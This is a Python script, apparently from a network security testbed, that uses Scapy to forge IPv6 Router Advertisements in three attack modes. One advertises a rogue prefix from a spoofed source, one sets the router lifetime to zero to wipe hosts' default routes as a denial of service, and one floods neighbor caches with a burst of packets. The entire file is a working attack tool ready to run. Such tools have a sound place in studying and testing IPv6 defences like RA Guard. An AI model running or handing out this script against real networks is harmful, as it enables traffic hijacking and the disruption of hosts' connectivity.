#!/usr/bin/env python3
"""
attacks/rogue_ra.py - Rogue Router Advertisement Attack Generator

Modes:
  1. unauthorized : Advertises rogue prefix (2001:db8:dead::/64) from unauthorized host
  2. lifetime0    : Advertises Router Lifetime = 0 (route deletion DoS attack)
  3. burst        : Rapid burst of RAs to flood neighbor caches
"""

import sys
import time
import argparse
import logging
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
from scapy.all import send, IPv6, ICMPv6ND_RA, ICMPv6NDOptPrefixInfo

def launch_rogue_ra(
    iface: str = [i for i in __import__('os').listdir('/sys/class/net/') if i != 'lo'][0],
    mode: str = "unauthorized",
    count: int = 1,
    interval: float = 1.0,
    fake_src: str = "fd00:abcd::dead:beef",
    rogue_prefix: str = "2001:db8:dead::",
    prefix_len: int = 64
):
    print(f"[*] Launching Rogue RA Attack [Mode: {mode}] on interface {iface}...")

    if mode == "lifetime0":
        # Lifetime 0 variant: instructs hosts to flush default router
        ra_pkt = IPv6(src=fake_src, dst="ff02::1", hlim=255) / \
                 ICMPv6ND_RA(routerlifetime=0, chlim=64) / \
                 ICMPv6NDOptPrefixInfo(prefix=rogue_prefix, prefixlen=prefix_len, validlifetime=0, preferredlifetime=0)
    elif mode == "burst":
        # Burst flood variant
        ra_pkt = IPv6(src=fake_src, dst="ff02::1", hlim=255) / \
                 ICMPv6ND_RA(routerlifetime=1800, chlim=64) / \
                 ICMPv6NDOptPrefixInfo(prefix=rogue_prefix, prefixlen=prefix_len, validlifetime=3600, preferredlifetime=1800)
        print(f"[*] Injecting burst of {count} packets...")
        for i in range(count):
            send(ra_pkt, iface=iface, verbose=False)
            time.sleep(0.05)
        print("[+] Burst attack complete.")
        return
    else:
        # Unauthorized source and unexpected prefix
        ra_pkt = IPv6(src=fake_src, dst="ff02::1", hlim=255) / \
                 ICMPv6ND_RA(routerlifetime=1800, chlim=64, M=1, O=1) / \
                 ICMPv6NDOptPrefixInfo(prefix=rogue_prefix, prefixlen=prefix_len, validlifetime=3600, preferredlifetime=1800)

    for i in range(count):
        send(ra_pkt, iface=iface, verbose=False)
        print(f"[+] Sent Rogue RA #{i+1} [mode={mode}, src={fake_src}, prefix={rogue_prefix}/{prefix_len}]")
        if i + 1 < count:
            time.sleep(interval)

    print("[+] Attack transmission completed.")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="PS-007 Rogue Router Advertisement Attack Tool")
    parser.add_argument("-i", "--iface", default="h2-eth0", help="Network interface to send on")
    parser.add_argument("-m", "--mode", choices=["unauthorized", "lifetime0", "burst"], default="unauthorized", help="Attack variant")
    parser.add_argument("-c", "--count", type=int, default=3, help="Number of RA packets to send")
    parser.add_argument("--interval", type=float, default=1.0, help="Interval between packets in seconds")
    parser.add_argument("--src", default="fd00:abcd::dead:beef", help="Source IPv6 address for rogue RA")
    parser.add_argument("--prefix", default="2001:db8:dead::", help="Advertised rogue prefix")
    args = parser.parse_args()

    launch_rogue_ra(
        iface=args.iface,
        mode=args.mode,
        count=args.count,
        interval=args.interval,
        fake_src=args.src,
        rogue_prefix=args.prefix
    )
